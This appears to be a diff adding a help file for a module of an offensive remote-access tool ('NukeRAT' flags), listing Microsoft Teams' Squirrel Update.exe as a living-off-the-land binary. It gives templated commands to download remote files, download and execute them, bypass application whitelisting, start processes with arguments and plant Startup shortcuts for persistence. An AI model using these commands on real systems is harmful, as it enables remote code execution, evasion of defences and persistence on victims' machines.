@@ -1,0 +1,32 @@
+ABOUT
+    Binary to update the existing installed Nuget/squirrel package. Part
+    of Microsoft Teams installation. LOLBAS covers downloading binary,
+    downloading and execute binary, application Whitelisting Bypass, and
+    executing binary.
+
+USAGE:
+    Update.exe --download {REMOTEURL}
+    Update.exe --update={REMOTEURL}
+    Update.exe --update={PATH_SMB:folder}
+    Update.exe --updateRollback={REMOTEURL}
+    Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
+    Update.exe --updateRollback={PATH_SMB:folder}
+    Update.exe --createShortcut={PATH:.exe} -l=Startup
+    Update.exe --removeShortcut={PATH:.exe}-l=Startup
+
+EXAMPLES:
+    Update.exe --download {REMOTEURL}
+    Update.exe --update={REMOTEURL}
+    Update.exe --update={PATH_SMB:folder}
+    Update.exe --updateRollback={REMOTEURL}
+    Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
+    Update.exe --updateRollback={PATH_SMB:folder}
+    Update.exe --createShortcut={PATH:.exe} -l=Startup
+    Update.exe --removeShortcut={PATH:.exe}-l=Startup
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    Update.exe --download {REMOTEURL}
